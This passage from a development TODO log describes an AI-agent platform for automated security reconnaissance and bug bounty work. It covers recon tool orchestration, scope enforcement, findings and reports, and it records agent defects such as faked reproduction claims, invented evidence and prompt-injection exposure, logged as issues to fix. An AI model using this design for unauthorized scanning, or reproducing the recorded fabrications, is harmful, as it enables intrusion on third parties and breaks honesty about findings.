      convention — read-only, so it deliberately skips the human-confirmation gate every real
      `ExecTool` requires. Frontend: `KnowledgeBasePanel` (status + Reindex) in the Workbench Home
      tab. 14 new backend tests (119 total). Verified live: reindex against the real workspace,
      and the exact `EmbeddingModelUnavailableError` message surfacing in the UI when the
      embedding model isn't pulled yet. Full end-to-end verification (a real folder + a real
      agent retrieving real code) is still blocked on the user providing a `WORKSPACE_ROOT` path
      and pulling an embedding model. See DEVELOPMENT.md's "RAG over a workspace codebase" section.
- [x] Security scanners (`types/scanner.ts`, `extensions/scannerRegistry.ts`). Done: "Scan
      Profiles" - a deterministic (non-agent) chained tool run, not the original in-process
      `Scanner.scan()` stub. Pick a target + a preset profile (Quick Recon, Subdomain Discovery,
      Web App Scan, Full Port Scan - `backend/src/scanners/builtins.ts`), preview every step's
      resolved command, then "Confirm & Run All" chains them sequentially through the existing
      `toolManager.ts` execution pipeline (`services/scanRunner.ts`) - one human confirmation for
      the whole profile up front (not per step, since a profile's tools/arguments are fixed, not
      chosen live by an LLM), Execution → Parser → Findings ingestion applies unchanged, and a
      failing step doesn't abort the rest. `GET /api/scanners` + project-scoped
      `GET/POST /api/projects/:projectId/scans[...]` (the create route streams NDJSON progress for
      the whole run). Frontend: `ScannerPanel.tsx` in the Workbench Home tab (profile+target picker
      → inline preview/confirm → live step progress/output → scan history). 11 new backend tests
      (220 total), 12 new frontend hook tests (182 total). Verified live via curl (a real Quick
      Recon run against `example.com` with one step genuinely failing and the scan still completing
      - proving failure isolation - plus a `nmap` Full Port Scan cancelled mid-flight) and
      in-browser through the real Workbench UI. See DEVELOPMENT.md's "Security scanners (Scan
      Profiles)" section, including a real duplicate-flag bug caught by live preview testing before
      it ever reached the browser.
- [x] Report generation. Done: generate a report from a **multi-finding selection** (checkbox-
      select rows in the Findings table, "Generate Report from N selected") - one agent call
      (Report Writer, `backend/data/agents/report-writer.json`) via `services/reportManager.ts`
      writes a single Markdown document (Executive Summary + one section per finding with Impact/
      Reproduction/Remediation), split into `ReportSection[]` by a lenient `## `-heading parser.
      Persisted per-project (`reports.json`, same pattern as executions/tasks/plans/scans) with a
      new "Reports" tab in Findings (list → full-document `Sheet` view → export to `.md` → two-step
      delete). `extensions/reportGenerator.ts` (confirmed dead in this session's audit above) was
      deleted outright, superseded by `services/reportManager.ts` - same "delete the stub, build
      the real thing in services/" pattern as `extensions/orchestrator.ts`. New project-scoped
      `GET/POST/DELETE /api/projects/:projectId/reports[...]`, `POST /` streams NDJSON
      (`chunk`/`report`/`error`) for a live-writing UX. 10 new backend tests (230 total), 21 new
      frontend tests (10 `useReports.test.ts` + FindingsTable selection coverage, 195 total).
      Verified live with a real local model (`qwen2.5-coder:7b`): two real findings (a critical
      SQLi + a low missing-CSP-header, both with genuine evidence) → a correctly-structured report
      grounded in that evidence, no fabrication observed - via curl and again in-browser end to end
      (select → title → stream → land on Reports tab → open full document → export → delete). See
      DEVELOPMENT.md's "Report generation" section.
- [ ] Plugin system (`types/plugin.ts`, `extensions/pluginRegistry.ts`)
- [x] Multi-agent orchestration. Done: a user-authored, ordered plan of `{agent, objective}` steps
      (≥2) runs sequentially, where each step is a *full* single-agent Orchestrator task
      (`services/orchestrator.ts`) — so a step can request tools and pause for the exact same
      Approve/Reject confirmation a standalone task uses — and each step's final answer is
      prepended (labeled by agent name) as context into the next step's objective, so e.g. Recon
      Agent → General Assistant actually chains real output, not just instructions in isolation.
      New `services/multiAgentOrchestrator.ts` (`createPlan`/`resumePlan`/`cancelPlan`), same
      pause/resume/persist pattern as the single-agent Orchestrator one level up, persisted per
      project to `multi-agent-plans.json`. `routes/plans.ts` streams create/resume as NDJSON and
      joins in the current step's live task server-side so the client needs only one fetch. This
      supersedes the `extensions/orchestrator.ts` placeholder (deleted — its call-and-return
      signature couldn't express "pause mid-plan for confirmation") and `types/orchestration.ts`
      (rewritten in place to the real shape). Frontend: extracted `OrchestratorTaskView.tsx` out of
      `OrchestratorWorkbench.tsx` (shared transcript/confirm-card rendering, real reuse since the
      new "Plans" tab needs the exact same view for its current step) and a new
      `MultiAgentPlanner.tsx` (step builder + run view with collapsible completed-step summaries).
      Verified via curl (context-chaining, pause-mid-plan-for-a-real-tool-confirmation via
      reject→resume, project isolation, restart persistence) and in-browser (a real Recon Agent →
      General Assistant plan, approving a live tool call mid-plan, watching it chain automatically
      into step 2 with the correct answer); also re-verified the single-agent Workbench tab is
      byte-for-byte unaffected by the `OrchestratorTaskView` extraction. 13 new backend tests
      (`multiAgentOrchestrator.test.ts`, mirroring `orchestrator.test.ts`'s mocking approach).
- [x] Real tool execution for recon (nmap, ffuf, nuclei, httpx, etc.) — done as the Tool Execution
      Framework above (`toolManager.ts`/`toolExecutor.ts`/`tools/exec/builtins.ts`), separate from
      the in-process `Tool`/`toolRegistry` used by the tool-calling round trip.
- [x] Project-scoped chat. Done: `ChatView.tsx` gained its own page-level "current project"
      selector (`ProjectPanel`, matching Workbench/Findings/Scanners/Reports each owning their
      own local selection). Chat sessions now dedup per **(agent, project)** pair instead of just
      per agent (`hooks/useSessions.ts#openChatSession`'s third, optional `projectId` param) - pick
      a project, open an agent, get that project's own thread with it; switch projects and reopen
      the same agent, get a genuinely separate thread; reopening the same (agent, project) pair
      resumes it instead of duplicating. Reuses the existing per-session `projectId` field (already
      built for opting a chat into tool use) rather than adding a parallel concept - a
      project-scoped thread now starts tool-enabled by design, not as a separate step. Session tabs
      and Command Center map tooltips disambiguate same-agent sessions by project name the same way
      task tabs already disambiguate by objective. 9 new frontend tests (5 in `useSessions.test.ts`,
      new `SessionTabs.test.tsx` for the label logic, 214 total). Verified live in-browser: two
      throwaway projects, opened Recon Agent under each - two genuinely separate, both tool-enabled
      tabs coexisted; reselecting the first project and reopening Recon Agent refocused the
      existing thread rather than creating a third. See DEVELOPMENT.md's "Project-scoped chat"
      section.
## New TODO (audited 2026-08-08)

Five feature requests, audited against the actual current codebase before any implementation - a
lot has been built since parts of this list were drafted, so several sub-items already exist
verbatim. Sub-items are individually checked; a task heading itself is only checked once every
sub-item under it is. Implementing gaps **one task at a time, in order** - only Task 1 has been
started/finished so far, the rest are audited but not yet touched.

### Task 1 — Tool Registry & Agent Tools

> Turn the existing tool execution engine into a complete Tool Registry UI. Implement: tool
> discovery from the backend; detect installed tools automatically; show tool name, version, path,
> description and status; enable/disable tools; tool categories (Recon, Network, Web, Fuzzing,
> Analysis, OS, Reporting); allow each AI agent to have its own allowed tools; agent configuration
> should read Agent.tools automatically; replace the current single tool checkbox with a proper
> multi-tool selector; show which tools an agent is currently allowed to use. Do not implement new
> security tools yet - focus on making the existing execution framework usable from the UI.

- [x] Tool discovery from the backend — `GET /api/tools` (`toolManager.ts#listExecToolsWithStatus`)
- [x] Detect installed tools automatically — `which`-based `resolveExecutablePath`,
      available/unavailable per tool
- [x] Show tool name, description, and status — `ToolRegistry.tsx`
- [x] Show tool version — `ExecTool.versionFlag` (a safe, per-tool "print version and exit" flag,
      deliberately omitted for `whois`/`nslookup` since an unrecognized flag risks a real network
      query on some implementations) probed via `spawnSync` with a 3s timeout in
      `toolManager.ts#resolveVersion`, surfaced as `ExecToolWithStatus.version`
- [x] Show tool path clearly — `ToolRegistry.tsx` now renders `resolvedPath ?? executable` as
      visible text (was tooltip-only before)
- [x] Enable/disable tools from the UI — `PATCH /api/tools/:id` (`toolManager.ts#setToolEnabled`),
      persisted to `backend/data/tools/overrides.json` and re-applied on startup
      (`loadToolOverridesFromDisk`, called from `index.ts`); toggle button in `ToolRegistry.tsx`
      (`Power` icon, wired through `useTools.ts#toggleTool`)
- [x] Tool categories: Recon / Network / Web / Fuzzing / Analysis / OS / Reporting —
      `ExecToolCategory` reworked to exactly these 7; every builtin tool remapped in
      `tools/exec/builtins.ts` (filesystem/git/bash/python → os, curl/http_request/httpx/katana →
      web, nmap/whois/dig/nslookup → network, ffuf → fuzzing, nuclei → analysis,
      subfinder/amass → recon). No tool is categorized "reporting" yet - none of the ~20 builtins
      fit it, and adding one would be a new security tool, out of scope per this task's own note.
- [x] Allow each agent to have its own allowed tools — `Agent.execTools?: string[]`, enforced in
      `orchestrator.ts` both in the tools preamble shown to the model and again at request time
- [x] Agent configuration reads the tool allowlist automatically — same field. Note: the request
      says "Agent.tools" specifically, but that field is the *other*, unused native-Ollama-tool-
      calling mechanism (`toolRegistry.ts`, zero tools registered) - `execTools` is the one that
      actually drives the real Tool Execution Framework this task is about. See `CLAUDE.md`'s "Two
      tool-calling mechanisms" section if this distinction matters for later tasks too.
- [x] Multi-tool selector replacing a single checkbox — `AgentEditor.tsx`'s "All tools" / "Select
      specific tools" toggle, grouped by category with live per-category selected/total counts
- [x] Show which tools an agent is currently allowed to use — same UI (also read-only-visible via
      the category counts when opening an existing agent for editing)

**Status: done (2026-08-08).** All sub-items implemented, typechecked, tested (backend
`toolManager.test.ts` +5 cases, frontend `useTools.test.ts` +1 case, 276/215 suites green), and
manually verified in the browser (version/path display, enable/disable toggle round-trip through
`GET /api/tools`, category grouping in `AgentEditor.tsx`).

### Task 2 — Autonomous Agent Execution Loop

> Upgrade the existing orchestrator so an agent can analyze the objective, decide whether a tool is
> required, select an allowed tool, generate arguments, request human confirmation, execute,
> receive the result, analyze it, decide the next action, and continue until the objective is
> complete. The agent must NOT simply respond with commands - it must actually execute approved
> tools through the existing ExecTool/toolManager system. Every execution must appear in the UI
> with: Agent, Tool, Command, Arguments, Status, Start time, Duration, Output, Confirmation state.
> Never bypass the existing human confirmation mechanism.

- [x] Full analyze → decide → select → generate args → confirm → execute → result → analyze →
      continue loop — this is exactly `services/orchestrator.ts`'s existing state machine
      (`running → waiting_confirmation → running → ... → completed/failed/...`), already built
- [x] Must actually execute approved tools, not just respond with commands — `requestExecution`/
      `confirmExecution` genuinely spawn the real OS process via `toolExecutor.ts`
- [x] Never bypass human confirmation — every `ExecTool` has `requiresConfirmation: true`; this was
      confirmed with the user as a hard design requirement before the Tool Execution Framework was
      ever built (see DEVELOPMENT.md)
- [x] Execution shows Tool/Command/Arguments/Status/Start time/Duration/Output/Confirmation state —
      all present on `ExecutionRecord` and rendered in `ExecutionConsole.tsx`/`ExecutionHistoryPanel.tsx`
- [x] Execution shows **Agent** — `ToolRequestBody.agentId`/`ExecutionRecord.agentId` (both
      optional - undefined for a manual, agent-less request), threaded from
      `orchestrator.ts#advance` (`task.agentId`) through `toolManager.ts#requestExecution`.
      `ExecutionHistoryPanel.tsx` resolves it to a name badge per row (via a new `agents` prop,
      same `agentName(agents, id)` lookup pattern already used by `OrchestratorWorkbench.tsx`/
      `MultiAgentPlanner.tsx`) and folds it into the row's search matching too.

**Status: done (2026-08-08).** Backend: 2 new tests in `toolManager.test.ts` (agentId carried
through for an agent-driven request, undefined for a manual one) plus 2 existing
`orchestrator.test.ts` assertions updated to expect the new field on `requestExecution`'s call
args. Frontend: `tsc -b`/`oxlint` clean, 277/215 tests green. Verified live: a `POST
/api/tools/request` with `agentId: "recon-agent"` round-tripped through `GET /api/tools/executions`
with the field intact, and the Workbench's Execution History panel rendered a "Recon Agent" badge
on that row while an older, agent-less manual execution right below it showed none.

### Task 3 — Bug Bounty Mission Workspace

> Create a proper Mission/Engagement system. A mission represents one authorized security
> assessment, with Name/Description/Scope/Out-of-scope targets/Rules/Start date/Status; an Assets
> inventory (domains, subdomains, IPs, URLs, ports, technologies, APIs); and an Activity log (agent
> actions, tool executions, commands, results, decisions, errors). Everything agents generate must
> belong to the active mission. Add a Mission selector to the main UI. When a mission is selected,
> the AI should receive the mission context. Do not allow an agent to execute against a target
> outside the mission scope. Make the Mission view the central place all work is organized.

- [x] Everything scoped to one project/"mission" — `projectId` already scopes tool executions,
      Orchestrator tasks, multi-agent plans, findings, scan runs, and reports (see `CLAUDE.md`'s
      "Projects" section)
- [x] A project/mission selector in the main UI — `ProjectPanel`, independently on every relevant
      view (Workbench, Findings, Chat)
- [x] Mission view as the central organizing place — arguably already true (Findings/Workbench/Chat
      all key off the selected project), though there's no single unified "Mission" screen combining
      scope+assets+activity+findings in one place the way the request describes
- [x] Structured mission fields (Description/Scope/Out-of-scope targets/Rules/Start date/Status) —
      `Project` gained `description?/scope?/outOfScope?/rules?/startDate?/status?`, all optional
      (existing `project.json` files with none of them keep working). Kept the "Project" name
      throughout rather than renaming to "Mission" (user's explicit choice - see DEVELOPMENT.md).
      Editable via a new `MissionEditor.tsx` sheet, opened from `ProjectPanel`'s per-card Edit
      (pencil) affordance.
- [x] Assets inventory — a new read-only `AssetsView.tsx`, derived entirely from existing Findings
      data (no new backend entity) - regroups findings by type into Domains/Subdomains/Ports/
      Technologies/APIs/Endpoints, deduplicated by canonical `value`. IP addresses have no
      dedicated `FindingType` (deliberately - see DEVELOPMENT.md) so they're recovered instead from
      any finding whose `target` happens to be IPv4-shaped.
- [x] Activity log — a new `ActivityFeed.tsx` + `useActivity.ts` hook, merging a project's tool
      executions and Orchestrator task transcripts (both already existed, just never combined) into
      one chronological feed. Frontend-only merge, no new backend entity.
- [x] AI receiving mission context automatically — `orchestrator.ts#buildToolsPreamble` (already had
      `projectId` in scope) now fetches the project and prepends a "Mission: ..." block
      (description/scope/out-of-scope/rules/status) to the tools preamble whenever any of those
      fields are set - omitted entirely for a project with none configured.
- [x] Scope enforcement — new `services/scopeMatcher.ts`, wired into
      `toolManager.ts#requestExecution`. Best-effort: since a tool request's `arguments` is an
      opaque `string[]` with no structured "target" concept, `extractTargets()` regex-extracts
      domain/IP/URL-looking tokens (filtered against a curated common-TLD allowlist to avoid
      matching dotted code identifiers like `process.stdout.write` or filenames like `app.py`).
      A clearly out-of-scope target throws `OutOfScopeError` (blocks outright, 403); when nothing
      target-shaped is found at all, the execution still proceeds but carries a new
      `ExecutionRecord.scopeWarning`, shown as an amber banner in `ExecutionConsole.tsx` before the
      human confirms. An empty/unset `scope` means no restriction (opt-in per mission).
- [x] Mission selector / central place — unchanged from the prior assessment (`ProjectPanel`
      already served this), now additionally the entry point to full mission editing.

**Status: done (2026-08-08).** 314 backend / 240 frontend tests (many new: `scopeMatcher.test.ts`,
`projectManager.test.ts` mission-field cases, `toolManager.test.ts` scope-enforcement cases,
`orchestrator.test.ts` mission-context-injection cases, `MissionEditor.test.tsx`,
`AssetsView.test.tsx`, `ActivityFeed.test.tsx`, `useActivity.test.ts`), both `tsc` checks and
`oxlint` clean. Verified live end-to-end on a real project: set scope via the Mission editor in the
browser, then confirmed via direct API calls that a request against an out-of-scope target was
blocked (`OUT_OF_SCOPE`) while an in-scope one succeeded: Assets/Activity tabs verified in the
browser against real historical data.

**Deliberately scoped down from the original ask** (see DEVELOPMENT.md for the full rationale):
Assets/Activity are derived views, not new backend entities; scope enforcement is best-effort for
freeform tool calls (Scan Profiles' explicit `target` field gets a definitive check for free,
since it's just another argv token to the same enforcement path); "Project" was kept as the
UI/technical term rather than renaming to "Mission" throughout.

### Task 4 — Findings & Evidence System

> Create a proper vulnerability management system. Agents must be able to create findings instead
> of only writing text. Finding fields: ID, Title, Severity, Confidence, Asset, URL, Endpoint,
> Parameter, Description, Impact, Reproduction steps, Evidence, Related tool executions, Related
> agents, Status, Created time. Statuses: Potential, Investigating, Confirmed, False Positive,
> Reported, Duplicate. Create an Evidence system (HTTP requests/responses, terminal output,
> screenshots, files, tool results, agent reasoning summaries). Every finding should link back to
> the exact execution and evidence that produced it. Add a Findings dashboard filterable by
> Severity, Confidence, Asset, Agent, Status.

- [x] Structured findings, not just text — the whole Findings Engine (`findingsManager.ts`,
      `types/finding.ts`), auto-parsed from tool output via per-tool parsers
- [x] ID/Title/Severity/Description/Evidence/Status/Created time — all present on `Finding`
- [x] Confidence — present (`Finding.confidence`, 0-1), just not currently a table filter (see below)
- [x] Findings dashboard with filtering — `FindingsView.tsx`/`FindingsTable.tsx`, filters by
      severity/type/tool/target/tag/search
- [x] Filter by **Confidence** — `FindingsView.tsx` gained an "Any confidence" dropdown (≥50/70/90%
      presets), backed by `FindingFilters.minConfidence` server-side
- [x] Filter by **Agent** specifically — new dropdown (only rendered when the project actually has
      agent-touched findings), matching `Finding.tool` (agent-sourced) or `relatedAgents`
- [x] `Parameter` field — `Finding.parameter?: string`, editable in `FindingDetails.tsx`'s new
      Details form
- [x] `Impact` field — `Finding.impact?: string`, same Details form; distinct from `description` now
- [x] `Reproduction steps` field — `Finding.reproductionSteps?: string`, same Details form
- [x] Status vocabulary — `FindingStatus` renamed wholesale to `potential`/`investigating`/
      `confirmed`/`false_positive`/`reported`/`duplicate`. Every finding (and each history entry)
      loaded from disk is migrated from the old vocabulary automatically
      (`findingsManager.ts#migrateFinding`: discovered/updated→potential, verified→confirmed,
      dismissed→false_positive) - no manual migration step, existing project data keeps working.
- [x] `Related tool executions` — `Finding.executionIds: string[]`, populated by
      `ingestExecution`/`upsertFinding` passing the triggering `ExecutionRecord.id` through
- [x] `Related agents` — `Finding.relatedAgents: string[]`, stamped by the new `create_finding`
      pseudo-tool (`createAgentFinding`) and accumulated across re-detection by a different agent
- [x] Evidence system (partial) — `Finding.evidence` is now `EvidenceItem[]`
      (`http_request`/`http_response`/`terminal_output`/`tool_result`/`agent_reasoning`/`note`,
      each with `content`+`createdAt`), capped at 20 items (oldest dropped first), deduplicated by
      content, rendered as a real list in `FindingDetails.tsx` instead of one flat `<pre>` block.
      Old string-shaped evidence is migrated into a single `note` item on load, same mechanism as
      the status migration. **Not done**: screenshots/file attachments - would need a binary upload
      endpoint and storage directory, a genuinely separate feature; text-based evidence types are
      fully supported, binary ones are not.
- [x] **Agents can create findings directly** (the task's headline ask) — new `create_finding`
      pseudo-tool in `orchestrator.ts` (JSON-payload-in-arguments[0] convention, same tool-result
      envelope as `query_findings`/`lookup_cves`), always listed in the preamble, skips human
      confirmation (records data, doesn't execute anything - same reasoning as manual finding
      creation already being ungated). Previously agents could only *read* findings via
      `query_findings`, never create one - this was the real gap behind "instead of only writing
      text" in the original task description.
- [ ] `Asset`/`URL`/`Endpoint` as distinct fields — still not a separate structured entity; `target`/
      `value`/`type: "endpoint"` cover most of this in practice (same underlying gap as Task 3's
      Assets view, which is itself derived from these same fields) - not pursued further this pass.

**Status: done (2026-08-08), with one disclosed partial gap** (binary evidence attachments). 328
backend / 252 frontend tests (new: `findingsManager.test.ts` +12 cases covering migration/
executionIds/evidence-cap/createAgentFinding/new filters, `orchestrator.test.ts` +6 cases for
`create_finding`, `FindingDetails.test.tsx` — new, 12 cases, `FindingsTable.test.tsx`/
`FindingsTimeline.test.tsx`/`AssetsView.test.tsx`/`useFindings.test.ts` updated for the new
vocabulary/evidence shape), both `tsc` checks and `oxlint` clean. Verified live against the real
`showpad.com` project: confirmed existing on-disk findings migrated correctly (old `"verified"` →
`"confirmed"`, string evidence → a `note`-typed `EvidenceItem`), created a finding with
parameter/impact/reproductionSteps/evidence via the API and confirmed it round-tripped correctly,
and visually confirmed the new Status column, status button group, Details form, and Evidence list
all render correctly in the browser.

### Task 5 — Autonomous Security Mission Controller

> Create a high-level Mission Controller above the existing multi-agent orchestrator. User provides
> "Assess this authorized target according to the defined scope." The Controller should read the
> scope, create a recon plan, assign tasks to agents, execute approved tools, collect results,
> update the asset inventory, identify attack surfaces, create follow-up tasks, assign specialist
> agents, validate vulnerabilities, create confirmed findings, collect evidence, and prepare a
> report - agents handing work to other agents automatically (Planner → Recon → Web Analyzer → ... →
> Report Writer). The UI must show this as a live mission graph (current/completed/waiting agents,
> pending tasks, tool executions, findings, approval requests, mission progress). Human stays the
> approval authority; no uncontrolled autonomous exploitation; scope-aware and confirmation-gated.

- [x] A real multi-agent execution primitive exists — `services/multiAgentOrchestrator.ts`
      (`createPlan`/`resumePlan`/`provideStepGuidance`/`cancelPlan`), each step a full single-agent
      Orchestrator task (tools + human confirmation all apply), context chained step to step
- [x] Human stays the approval authority, confirmation-gated — inherited from the single-agent
      Orchestrator underneath every step; nothing in this codebase's design bypasses it anywhere
- [x] Automatic planning above the existing orchestrator — `services/factoryDirector.ts`
      (`advanceMission`), built as part of the Bug Bounty Factory transformation (see
      DEVELOPMENT.md's section of that name). Deliberately **deterministic/rule-based rather than a
      free-form "Assess this target" single-LLM-instruction planner** (no assets yet → Recon; a new
      domain/subdomain/ip asset → Enumeration; an unsettled finding → Validation) — a considered v1
      choice for reliability/testability over the more open-ended design this checklist originally
      envisioned, documented as a real design call rather than a shortfall. The existing `planner`
      agent could still be layered in later as a smarter planning step; not done here.
- [x] Automatic hand-off / dynamic re-planning (assign specialist agents, create follow-up tasks
      based on what recon finds) — `factoryDirector.ts#seedWorkOrders`, idempotent across repeated
      `advanceMission` calls, auto-chains through everything that doesn't need human approval; live-
      verified end to end (recon → asset discovered → enumeration auto-seeded → finding created →
      validation work order auto-seeded)
- [x] Asset-inventory updates as an explicit mission-controller responsibility — `services/
      assetManager.ts` is a real store now (`types/asset.ts`), `upsertAsset` called centrally from
      `findingsManager.ts`'s ingest path plus a new `upsert_asset` pseudo-tool, exactly as this task
      anticipated once Task 3's Assets concept existed for real (see the Bug Bounty Factory
      transformation section — Assets moved from Task 3's deliberate "derive from Findings" choice
      to a real stored entity as part of this work, on the user's explicit instruction)
- [x] A live mission visual (current/completed/waiting agents, pending tasks, tool executions,
      findings, approval requests, mission progress) — `FactoryDashboard.tsx` (stat tiles + a
      "Start/Advance Factory" action) + `FactoryPipeline.tsx` (10-stage pipeline view) +
      `ApprovalQueue.tsx` (aggregated pending confirmations) + `WorkOrdersView.tsx`, all built from
      real `WorkOrder`/`Asset`/`Finding`/activity data — not literally a node-graph like
      `AgentNetwork.tsx`'s session map, but the same live-status information the original checklist
      item asked for, in dashboard/pipeline form instead
- [ ] Report preparation as the final automatic step of a mission — still a separate,
      human-triggered action (select findings → generate); the Factory Director advances a mission's
      `status` to `"reporting"` once everything else has settled, but deliberately does **not**
      auto-invoke `reportManager.ts` itself — report generation crossing into "the AI decided to
      publish something" felt like it warranted an explicit human trigger even in an otherwise
      autonomous pipeline, same spirit as every other approval gate in this app. Not pursued further
      this pass.

**Status: mostly done (see the "Bug Bounty Factory transformation" section of DEVELOPMENT.md for the
full write-up).** The one remaining item (fully automatic report triggering) is a deliberate scope
boundary, not an oversight — reference this list again if that boundary should move.

## Known issues surfaced during the Bug Bounty Factory transformation (2026-08-19)

Found during live end-to-end verification of the transformation above (see DEVELOPMENT.md and
`rework.md`), not fixed in that pass since none block the transformation itself:

- [x] **`CLAUDE.md`'s "Agents" section is stale/inaccurate.** (Since corrected.) It says agent configs are "Loaded
      fresh from disk on every GET /api/agents call - not cached at boot." `agentManager.ts` actually
      caches the agent list in a module-level variable after first load and only refreshes via
      `reloadAgents()` (hit by create/update/delete, or `POST /api/agents/reload`) — editing a
      `backend/data/agents/*.json` file directly does *not* take effect until that endpoint is
      called. Pre-existing, not introduced by this session's work; surfaced by hand-editing an
      agent's `model` for live testing and seeing the old value keep winning until reload was called
      explicitly. One-line `CLAUDE.md` correction, whenever that section is next touched.
- [x] (Retry button exists in `WorkOrdersView.tsx`, verified live 2026-11-05.) **The Factory Director never retries a work order once one exists for an agent, even if it
      failed.** `factoryDirector.ts#seedWorkOrders`'s dedup check (`existing.some((wo) => wo.agentId
      === RECON_AGENT_ID)`) matches regardless of status - a deliberate "human-attention signal, not
      something to paper over" per that file's own doc comment, but there's currently no UI
      affordance nudging a human toward the obvious recovery (manually create a fresh `WorkOrder` for
      the same agent via `POST /api/missions/:id/workorders`, confirmed live during verification as
      the actual working path). Worth a "Retry" button on a failed work order card in
      `WorkOrdersView.tsx` that does exactly this, rather than requiring a human to know the API.
- [ ] Local-model tool-call formatting compliance remains an open, pre-existing characteristic (not
      new): a 27B model validating a finding reasoned in prose before emitting the `validate_finding`
      tool-call JSON and got cut off by `maxTokens`, so the whole reply was correctly treated as a
      plain-text final answer rather than a tool call (no state changed, no bug — see the "Two
      tool-calling mechanisms" section of `CLAUDE.md` and the original "Tool-calling round trip"
      section of DEVELOPMENT.md for the same gap documented elsewhere). Worth considering a slightly
      higher default `maxTokens` for `vulnerability-validator` specifically, given its new checklist-
      driven system prompt now asks for more reasoning before the verdict than the original one did.

## Nav simplification follow-ups (2026-08-19)

Surfaced while cutting Chat/Workbench/Plans/standalone-Evidence per direct user feedback (see
DEVELOPMENT.md's "Nav simplification" section) - not fixed in that pass, flagged for a decision:

- [x] **`SettingsPanel.tsx`'s settings (temperature/top_p/max tokens/context size/keep-alive) are
      now fully orphaned.** They existed to configure manual (no-agent) Chat requests; now that Chat
      is gone, nothing in the app reads `useSettings.ts`'s stored values any more - every agent's
      sampling settings come from its own `backend/data/agents/*.json` config instead. The gear-icon
      Settings panel still opens and still persists values to `localStorage`, it just has no effect
      on anything. Options: remove it entirely (continues the same simplification this session did),
      or repurpose it as an editable *default* that seeds new agent configs / work order objectives
      - needs a decision, not a unilateral call.
      **Resolved 2026-09-20 (POLISH.md B1): removed outright** - `SettingsPanel.tsx`,
      `useSettings.ts`, `types/settings.ts`, the App wiring, the TopBar gear button, and the
      Command Palette's settings command (its values ruled nothing; every agent carries its own
      sampling config).
- [x] (Retry button exists, verified live 2026-11-05.) A failed Work Order has no in-UI retry affordance - `factoryDirector.ts` will seed a fresh one
      automatically once the blocking condition changes (e.g. scope gets added), but a work order
      that failed for an unrelated transient reason (model briefly offline, a flaky tool) currently
      needs a manual `POST /api/missions/:id/workorders` to retry. Worth a "Retry" button on a failed
      Work Order card in `WorkOrdersView.tsx` that recreates it with the same agent/objective/target.

## Audit findings (2026-11-05)

Full-project audit and fix pass - see DEVELOPMENT.md's "Audit and fix pass (2026-11-05)" for what was
fixed and why. Deliberately left open:

- [ ] **The validator rubber-stamps.** In live runs on `qwen2.5-coder:7b` it wrote "Reproduced using
      nmap" without running anything, and confirmed a misidentified `ppp?` service. `confirmed` currently
      means an agent said so - consider requiring a tool execution in that task before accepting it.
- [ ] **Scope has no port or path granularity, and `rules` is only advisory.** Given scope `127.0.0.1`
      and rules naming one port, the recon agent scanned the host's top 1000 ports. Scope enforcement
      passed it, correctly by its own definition.
- [x] `ffuf` can't reach system wordlists (the workspace sandbox refuses them, correctly), so agents
      stalled on it. `backend/workspace/wordlists/common.txt` now ships and the usage hint names it.
- [ ] `nomic-embed-text` isn't installed here, so knowledge-base search fails despite a loaded index.
- [ ] `katana`, `subfinder`, `amass` aren't installed; `/usr/bin/httpx` is not the ProjectDiscovery tool.
- [x] The same port can land as two assets (`127.0.0.1:8765` from an agent, `8765/tcp` from the parser).
      `upsertAsset` now merges them. A service still can (`8080` next to `8080/tcp:http`).
- [ ] Time cap is checked between generations, not during one (the per-chunk idle timeout covers a
      hung model; a slow-but-streaming reply can overrun by one generation).
- [ ] Scan and report `GET`/`PATCH` routes look ids up across missions without checking the id in the
      path belongs to that mission.
- [ ] `InvalidToolArgumentsError` messages include absolute paths (local-only app, low impact).
- [ ] An IPv4-mapped IPv6 target isn't matched against an IPv4 `outOfScope` entry.
- [ ] Prompt injection is reduced, not solved: report prompts now mark finding data as untrusted, and
      the UI won't auto-load remote images, but a local model can still follow injected text. The human
      confirmation gate on every real tool run remains the actual control.
- [ ] Still open from POLISH.md: route-level integration tests (D1), a shared NDJSON helper (D2),
      status-code consistency (D3).
- [x] After the UI cleanup (DEVELOPMENT.md, "UI cleanup"), try the Findings filter bar and report bar
      on a mission with real findings. Done live, see DEVELOPMENT.md's "End-to-end mission run".

## End-to-end mission run (2026-11-05)

Left open by the live run - see DEVELOPMENT.md's "End-to-end mission run":

- [x] **Reports contain evidence the model made up.** Evidence and reproduction sections are now
      built from recorded executions, and anything else is labelled unverified - see "Report evidence
      from recorded runs" in DEVELOPMENT.md.
- [ ] **A report's prose can still overstate a finding.** The model's impact text can treat an unverified
      finding as real (live run: "the exposure of backup files" over a made-up response) or misread real
      output. It now sits next to the label that says so, but nothing checks the prose itself.
- [ ] **Report remediation loses code blocks.** Sanitizing removes all of them, so a genuine config
      snippet goes too. Accepted for now - a lost snippet costs less than a fake scan result.
- [ ] **Validators and other agents confirm too easily.** Same root as "The validator rubber-stamps"
      above: "Outdated Python" was confirmed as high, and `backup` was marked duplicate. Non-validator
      agents can also call `validate_finding` - the Web Analyzer confirmed a port finding and raised it
      to medium. Offer that tool to the validator only.
- [ ] A failed order still counts toward the dashboard's "work orders failed" banner after a successful
      Retry.
- [ ] Agents ask for scans already done, and a rejected tool is often just requested again.

## MCP tool and RAG providers (planned 2026-11-08)

Design and reasoning: "Planned: MCP servers as the tool and RAG providers" in DEVELOPMENT.md. The model
stays local; tools and RAG move behind MCP servers; approval, scope, ingestion and history stay in 8Rack.

Decide before step 3:

- [x] **Transport: streamable HTTP.** Decided 2026-11-08.
- [x] **Where the tool server runs: a separate scanning host.** Decided 2026-11-08. What follows from
      both is under "Decided: HTTP to a separate scanning host" in DEVELOPMENT.md.
- [ ] **How the RAG server embeds.** Its own embedding model, or a call back to this machine's Ollama.
      Also where the indexed files live if the server isn't on this machine.

Steps:

- [x] **1. MCP client.** Done 2026-11-08 - see "MCP client (step 1)" in DEVELOPMENT.md.
      `services/mcpClient.ts` connects to the servers in `MCP_SERVERS` and lists their tools on Tools →
      MCP servers, read-only. Two parts of the original step moved to where they can do something:
      adding MCP tools to the Orchestrator's catalog, and the enable switch, both go with the first
      server agents actually call (step 2). `extensions/toolRegistry.ts` / `types/tool.ts` are not the
      adapter: their `execute()` runs a tool directly, with no approval step.
- [ ] **Delete `extensions/toolRegistry.ts` and `types/tool.ts`** (step 3 has now landed), along with
      the native tool-calling branch in `chatService.ts` that reads them, unless native tool-calling is
      picked up by then. Ready to do now - the plain-text Orchestrator convention is the only path
      agents use, MCP tools included.
- [ ] **2. RAG server.** Move `search_knowledge_base`, reindex and status behind an MCP server. Keep
      the Knowledge Base panel working against it. This is the first MCP tool agents call, so it also
